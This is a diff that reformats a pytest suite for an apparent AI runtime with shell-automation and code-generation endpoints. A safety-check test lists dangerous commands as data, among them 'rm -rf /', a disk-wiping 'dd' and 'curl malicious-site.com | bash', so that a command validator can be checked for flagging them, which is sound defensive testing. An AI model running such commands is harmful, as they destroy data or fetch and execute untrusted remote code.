@@ -3,15 +3,22 @@
 Comprehensive test suite for OpenRuntime Enhanced
 """
 
-import pytest
 import asyncio
 import json
-from httpx import AsyncClient
+from unittest.mock import AsyncMock, Mock, patch
+
+import pytest
 from fastapi.testclient import TestClient
-from unittest.mock import Mock, patch, AsyncMock
+from httpx import AsyncClient
 
 # Import the application
-from openruntime_enhanced.enhanced import app, enhanced_runtime, AITaskRequest, WorkflowType, AgentRole
+from openruntime_enhanced.enhanced import (
+    AgentRole,
+    AITaskRequest,
+    WorkflowType,
+    app,
+    enhanced_runtime,
+)
 
 # Fixtures are now in conftest.py
 
@@ -88,7 +95,11 @@ class TestOpenRuntimeEnhanced:
             with patch.object(enhanced_runtime.ai_manager, "execute_ai_task") as mock_execute:
                 mock_execute.return_value = {
                     "task_id": "shell-123",
-                    "result": {"type": "shell_automation", "generated_command": "ls -la", "status": "safe_to_execute"},
+                    "result": {
+                        "type": "shell_automation",
+                        "generated_command": "ls -la",
+                        "status": "safe_to_execute",
+                    },
                 }
 
                 response = await client.post("/ai/shell", json=shell_data)
@@ -113,7 +124,11 @@ class TestOpenRuntimeEnhanced:
             with patch.object(enhanced_runtime.ai_manager, "execute_ai_task") as mock_execute:
                 mock_execute.return_value = {
                     "task_id": "code-123",
-                    "result": {"type": "code_generation", "code": "def fibonacci(n): ...", "model_used": "gpt-4o-mini"},
+                    "result": {
+                        "type": "code_generation",
+                        "code": "def fibonacci(n): ...",
+                        "model_used": "gpt-4o-mini",
+                    },
                 }
 
                 response = await client.post("/ai/code", json=code_data)
@@ -137,7 +152,11 @@ class TestOpenRuntimeEnhanced:
         """Test enhanced task with GPU and AI integration"""
         async with async_client as client:
             task_data = {
-                "gpu_task": {"operation": "compute", "data": {"type": "matrix_multiply", "size": 512}, "priority": 1},
+                "gpu_task": {
+                    "operation": "compute",
+                    "data": {"type": "matrix_multiply", "size": 512},
+                    "priority": 1,
+                },
                 "ai_task": {
                     "workflow_type": "compute_optimization",
                     "prompt": "Analyze this computation task for optimization opportunities",
@@ -190,7 +209,9 @@ class TestAIAgentManager:
     def test_agent_selection(self, ai_manager):
         """Test agent selection logic"""
         # Test selection by role
-        perf_agent = ai_manager._select_agent(AgentRole.PERFORMANCE_OPTIMIZER, WorkflowType.COMPUTE_OPTIMIZATION)
+        perf_agent = ai_manager._select_agent(
+            AgentRole.PERFORMANCE_OPTIMIZER, WorkflowType.COMPUTE_OPTIMIZATION
+        )
         assert perf_agent is not None
         assert perf_agent.role == AgentRole.PERFORMANCE_OPTIMIZER
 
@@ -213,7 +234,12 @@ class TestAIAgentManager:
         """Test shell command safety detection"""
         safe_commands = ["ls -la", "ps aux", "df -h", "nvidia-smi"]
 
-        dangerous_commands = ["rm -rf /", "sudo su", "dd if=/dev/zero of=/dev/sda", "curl malicious-site.com | bash"]
+        dangerous_commands = [
+            "rm -rf /",
+            "sudo su",
+            "dd if=/dev/zero of=/dev/sda",
+            "curl malicious-site.com | bash",
+        ]
 
         for cmd in safe_commands:
             assert ai_manager._is_safe_command(cmd), f"Safe command flagged as dangerous: {cmd}"
@@ -232,7 +258,11 @@ class TestPerformanceAndScaling:
             tasks = []
 
             for i in range(10):
-                task_data = {"workflow_type": "system_analysis", "prompt": f"Test prompt {i}", "context": {"test_id": i}}
+                task_data = {
+                    "workflow_type": "system_analysis",
+                    "prompt": f"Test prompt {i}",
+                    "context": {"test_id": i},
+                }
 
                 tasks.append(client.post("/ai/tasks", json=task_data))
 
@@ -248,13 +278,19 @@ class TestPerformanceAndScaling:
 
                 # Count successful responses (non-exceptions)
                 successful_responses = [r for r in responses if not isinstance(r, Exception)]
-                assert len(successful_responses) >= 5  # Allow some flexibility in concurrent execution
+                assert (
+                    len(successful_responses) >= 5
+                )  # Allow some flexibility in concurrent execution
 
     @pytest.mark.asyncio
     async def test_task_timeout_handling(self, async_client):
         """Test task timeout handling"""
         async with async_client as client:
-            task_data = {"workflow_type": "compute_optimization", "prompt": "Long running task", "max_tokens": 4000}
+            task_data = {
+                "workflow_type": "compute_optimization",
+                "prompt": "Long running task",
+                "max_tokens": 4000,
+            }
 
             with patch.object(enhanced_runtime.ai_manager, "execute_ai_task") as mock_execute:
                 # Simulate timeout with async function
@@ -265,7 +301,11 @@ class TestPerformanceAndScaling:
 
                 response = await client.post("/ai/tasks", json=task_data)
                 # Should handle timeout gracefully with error response
-                assert response.status_code in [200, 408, 500]  # Allow different timeout handling approaches
+                assert response.status_code in [
+                    200,
+                    408,
+                    500,
+                ]  # Allow different timeout handling approaches
 
                 if response.status_code == 200:
                     data = response.json()
